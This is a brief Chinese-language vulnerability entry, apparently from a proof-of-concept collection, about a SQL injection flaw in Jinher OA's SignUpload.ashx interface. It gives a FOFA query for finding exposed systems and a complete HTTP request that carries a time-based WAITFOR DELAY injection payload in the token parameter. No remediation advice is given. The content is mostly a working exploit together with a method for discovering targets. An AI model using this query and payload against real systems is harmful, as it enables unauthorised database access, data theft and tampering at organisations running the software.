# 金和OA系统接口SignUpload.ashx存在SQL注入漏洞

金和OA系统接口SignUpload.ashx存在SQL注入漏洞，允许攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全。

## fofa

```javascript
body="JHSoft.Web.AddMenu" || app="金和网络-金和OA" || app="Jinher-OA"
```

## poc

```java
GET /C6/Jhsoft.Web.ask/SignUpload.ashx?token=1%3BWAITFOR+DELAY+%270%3A0%3A%201%27+--%20and%201=1_123_123&filename=1 HTTP/1.1
Host: ip:port 
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
Connection: close
Content-Length: 189
Content-Type: text/plain
Accept-Encoding: gzip
```

![image-20240920134727109](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409201347183.png)
